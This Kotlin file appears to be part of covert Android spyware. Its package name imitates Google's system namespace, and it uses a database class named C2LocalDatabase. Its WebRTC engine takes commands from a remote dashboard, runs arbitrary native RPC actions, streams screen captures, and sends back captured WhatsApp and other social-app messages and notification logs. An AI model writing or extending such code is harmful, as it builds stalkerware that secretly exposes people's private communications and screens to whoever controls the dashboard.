package com.google.android.system

import android.content.Context
import android.util.Log
import com.homemonitor.WebDashboardApiRouter
import org.json.JSONObject
import org.webrtc.*
import java.nio.ByteBuffer
import java.nio.charset.StandardCharsets

/**
 * WebRtcEngine
 * Android WebRTC manager wrapping PeerConnectionFactory, PeerConnection, STUN, and DataChannel.
 *
 * Fixed Architecture Role: Android is the Sole SDP Answerer.
 */
class WebRtcEngine(
    private val context: Context,
    private val signalingCoordinator: SignalingCoordinator
) : PeerConnection.Observer, DataChannel.Observer {

    private var factory: PeerConnectionFactory? = null
    private var peerConnection: PeerConnection? = null
    private var dataChannel: DataChannel? = null
    @Volatile private var activeSessionId: String? = null

    companion object {
        private const val TAG = "WebRtcEngine"
    }

    init {
        initializeFactory()
    }

    private fun initializeFactory() {
        try {
            val initOptions = PeerConnectionFactory.InitializationOptions.builder(context)
                .setEnableInternalTracer(true)
                .createInitializationOptions()
            PeerConnectionFactory.initialize(initOptions)

            val options = PeerConnectionFactory.Options()
            factory = PeerConnectionFactory.builder()
                .setOptions(options)
                .createPeerConnectionFactory()

            Log.i(TAG, "Initialized PeerConnectionFactory successfully.")
        } catch (e: Exception) {
            Log.e(TAG, "initializeFactory error: ${e.message}")
        }
    }

    /**
     * Start Answerer Session
     * Initiates PeerConnection as sole SDP Answerer for incoming session.
     */
    fun startAnswererSession(sessionId: String) {
        try {
            close()
            activeSessionId = sessionId
            val iceServers = listOf(
                PeerConnection.IceServer.builder("stun:stun.cloudflare.com:3478").createIceServer(),
                PeerConnection.IceServer.builder("stun:stun.l.google.com:19302").createIceServer(),
                PeerConnection.IceServer.builder("stun:stun1.l.google.com:19302").createIceServer(),
                PeerConnection.IceServer.builder("stun:stun2.l.google.com:19302").createIceServer()
            )

            val rtcConfig = PeerConnection.RTCConfiguration(iceServers).apply {
                sdpSemantics = PeerConnection.SdpSemantics.UNIFIED_PLAN
                continualGatheringPolicy = PeerConnection.ContinualGatheringPolicy.GATHER_CONTINUALLY
            }

            peerConnection = factory?.createPeerConnection(rtcConfig, this)
            Log.i(TAG, "Created PeerConnection for Answerer Session: $sessionId")
        } catch (e: Exception) {
            Log.e(TAG, "startAnswererSession error: ${e.message}")
        }
    }

    private val pendingIceCandidates = mutableListOf<IceCandidate>()

    private fun drainPendingIceCandidates() {
        if (peerConnection != null && peerConnection?.remoteDescription != null) {
            val copy = ArrayList(pendingIceCandidates)
            pendingIceCandidates.clear()
            for (cand in copy) {
                peerConnection?.addIceCandidate(cand)
            }
        }
    }

    /**
     * Handle Remote SDP Offer from Web Dashboard.
     */
    fun handleRemoteOffer(sdp: String) {
        try {
            val remoteSdp = SessionDescription(SessionDescription.Type.OFFER, sdp)
            peerConnection?.setRemoteDescription(object : SdpObserverAdapter() {
                override fun onSetSuccess() {
                    Log.i(TAG, "Remote Description (Offer) set successfully. Draining candidates & creating answer...")
                    drainPendingIceCandidates()
                    createAnswer()
                }
                override fun onSetFailure(reason: String?) {
                    Log.e(TAG, "setRemoteDescription (Offer) failure: $reason")
                }
            }, remoteSdp)
        } catch (e: Exception) {
            Log.e(TAG, "handleRemoteOffer error: ${e.message}")
        }
    }

    private fun createAnswer() {
        val constraints = MediaConstraints()
        peerConnection?.createAnswer(object : SdpObserverAdapter() {
            override fun onCreateSuccess(desc: SessionDescription?) {
                desc?.let { localDesc ->
                    peerConnection?.setLocalDescription(object : SdpObserverAdapter() {
                        override fun onSetSuccess() {
                            activeSessionId?.let { sessId ->
                                Log.i(TAG, "Local Description (Answer) set successfully. Posting answer to signaling coordinator...")
                                signalingCoordinator.postSdpAnswer(sessId, localDesc.description)
                            }
                        }
                        override fun onSetFailure(reason: String?) {
                            Log.e(TAG, "setLocalDescription (Answer) failure: $reason")
                        }
                    }, localDesc)
                }
            }
            override fun onCreateFailure(reason: String?) {
                Log.e(TAG, "createAnswer failure: $reason")
            }
        }, constraints)
    }

    @Synchronized
    fun addRemoteIceCandidate(candidateObj: JSONObject) {
        try {
            val candStr = candidateObj.optString("candidate", "")
            if (candStr.isBlank()) return
            val cand = IceCandidate(
                candidateObj.optString("sdpMid", "0"),
                candidateObj.optInt("sdpMLineIndex", 0),
                candStr
            )
            if (peerConnection != null && peerConnection?.remoteDescription != null) {
                peerConnection?.addIceCandidate(cand)
            } else {
                pendingIceCandidates.add(cand)
            }
        } catch (e: Exception) {
            Log.e(TAG, "addRemoteIceCandidate error: ${e.message}")
        }
    }

    fun sendP2pMessage(msgType: String, payloadJson: JSONObject) {
        try {
            if (dataChannel?.state() == DataChannel.State.OPEN) {
                val envelope = JSONObject().apply {
                    put("type", msgType)
                    put("payload", payloadJson)
                    put("timestamp", System.currentTimeMillis())
                }
                val bytes = envelope.toString().toByteArray(StandardCharsets.UTF_8)
                val buffer = DataChannel.Buffer(ByteBuffer.wrap(bytes), false)
                dataChannel?.send(buffer)
            }
        } catch (e: Exception) {
            Log.e(TAG, "sendP2pMessage error: ${e.message}")
        }
    }

    fun sendScreenFrame(base64Jpeg: String) {
        if (base64Jpeg.isBlank()) return
        // Backpressure check: Drop frame if queued buffer exceeds 128 KB
        val buffered = dataChannel?.bufferedAmount() ?: 0L
        if (buffered > 131_072L) {
            Log.w(TAG, "DataChannel backpressure threshold exceeded ($buffered bytes). Dropping frame.")
            return
        }
        val payload = JSONObject().apply {
            put("frame", base64Jpeg)
        }
        sendP2pMessage("SCREEN_FRAME", payload)
    }

    fun close() {
        try {
            dataChannel?.close()
            peerConnection?.close()
            peerConnection = null
            dataChannel = null
            activeSessionId = null
            pendingIceCandidates.clear()
        } catch (_: Exception) {}
    }

    // PeerConnection.Observer Callbacks
    override fun onIceCandidate(candidate: IceCandidate?) {
        candidate?.let {
            activeSessionId?.let { sessId ->
                signalingCoordinator.postIceCandidate(sessId, it.sdp, it.sdpMid, it.sdpMLineIndex)
            }
        }
    }

    override fun onDataChannel(dc: DataChannel?) {
        Log.i(TAG, "Received Remote RTCDataChannel from Browser Offer 🟢")
        dataChannel = dc
        dataChannel?.registerObserver(this)
    }

    override fun onSignalingChange(state: PeerConnection.SignalingState?) {
        Log.i(TAG, "Signaling State Change: $state")
    }
    override fun onIceConnectionChange(state: PeerConnection.IceConnectionState?) {
        Log.i(TAG, "ICE Connection State: $state")
    }
    override fun onIceConnectionReceivingChange(receiving: Boolean) {}
    override fun onIceGatheringChange(state: PeerConnection.IceGatheringState?) {}
    override fun onIceCandidatesRemoved(candidates: Array<out IceCandidate>?) {}
    override fun onAddStream(stream: MediaStream?) {}
    override fun onRemoveStream(stream: MediaStream?) {}
    override fun onRenegotiationNeeded() {}
    override fun onAddTrack(receiver: RtpReceiver?, streams: Array<out MediaStream>?) {}

    // DataChannel.Observer Callbacks
    override fun onBufferedAmountChange(previousAmount: Long) {}
    override fun onStateChange() {
        Log.i(TAG, "DataChannel State: ${dataChannel?.state()}")
    }
    override fun onMessage(buffer: DataChannel.Buffer?) {
        buffer?.let {
            val bytes = ByteArray(it.data.remaining())
            it.data.get(bytes)
            val msgText = String(bytes, StandardCharsets.UTF_8)
            Log.i(TAG, "Received P2P DataChannel Message: '$msgText'")

            try {
                if (msgText.startsWith("{")) {
                    val req = JSONObject(msgText)
                    val type = req.optString("type", "")

                    if (type == "PING") {
                        val reqTs = req.optLong("timestamp", System.currentTimeMillis())
                        val pongPayload = JSONObject().apply {
                            put("timestamp", reqTs)
                            put("deviceTime", System.currentTimeMillis())
                            put("status", "ACTIVE")
                        }
                        sendP2pMessage("PONG", pongPayload)
                    } else if (type == "RPC_REQUEST") {
                        val requestId = req.optString("requestId", "")
                        val action = req.optString("action", "")
                        val paramsObj = req.optJSONObject("params") ?: JSONObject()

                        val responseData = NativeRpcActionExecutor.executeNativeAction(context, action, paramsObj)

                        val resPayload = JSONObject().apply {
                            put("type", "RPC_RESPONSE")
                            put("requestId", requestId)
                            put("action", action)
                            put("status", "SUCCESS")
                            put("data", responseData)
                            put("timestamp", System.currentTimeMillis())
                        }
                        sendP2pMessage("RPC_RESPONSE", resPayload)
                    } else if (type == "API_REQUEST") {
                        val requestId = req.optString("requestId", "")
                        val path = req.optString("path", "/api/summary")
                        val method = req.optString("method", "GET")
                        val body = req.optString("body", "")
                        val pathUri = android.net.Uri.parse(path)

                        val httpResponseStr = WebDashboardApiRouter.handleApiRequest(
                            context = context,
                            method = method,
                            cleanPath = pathUri.path ?: path,
                            pathUri = pathUri,
                            bodyString = body,
                            clientIp = "P2P_WEBRTC"
                        )

                        val bodyIndex = httpResponseStr.indexOf("\r\n\r\n")
                        val responseContent = if (bodyIndex != -1) httpResponseStr.substring(bodyIndex + 4) else httpResponseStr

                        val resPayload = JSONObject().apply {
                            put("requestId", requestId)
                            put("path", path)
                            put("status", 200)
                            put("data", try { JSONObject(responseContent) } catch (_: Exception) { try { org.json.JSONArray(responseContent) } catch (_: Exception) { responseContent } })
                        }
                        sendP2pMessage("API_RESPONSE", resPayload)
                    } else if (type == "DB_QUERY_SOCIAL") {
                        val appKey = req.optString("appKey", "whatsapp")
                        val messagesArray = C2LocalDatabase.getInstance(context).getSocialMessagesJson(appKey)
                        val res = JSONObject().apply {
                            put("type", "DB_RESPONSE_SOCIAL")
                            put("appKey", appKey)
                            put("messages", messagesArray)
                        }
                        sendP2pMessage("DB_RESPONSE_SOCIAL", res)
                    } else if (type == "DB_QUERY_TELEMETRY") {
                        val cat = req.optString("category", "notifications")
                        val logsArray = C2LocalDatabase.getInstance(context).getTelemetryLogsJson(cat)
                        val res = JSONObject().apply {
                            put("type", "DB_RESPONSE_TELEMETRY")
                            put("category", cat)
                            put("logs", logsArray)
                        }
                        sendP2pMessage("DB_RESPONSE_TELEMETRY", res)
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "onMessage error: ${e.message}")
            }
        }
    }

    private open class SdpObserverAdapter : SdpObserver {
        override fun onCreateSuccess(desc: SessionDescription?) {}
        override fun onSetSuccess() {}
        override fun onCreateFailure(reason: String?) {
            Log.e(TAG, "onCreateFailure: $reason")
        }
        override fun onSetFailure(reason: String?) {
            Log.e(TAG, "onSetFailure: $reason")
        }
    }
}
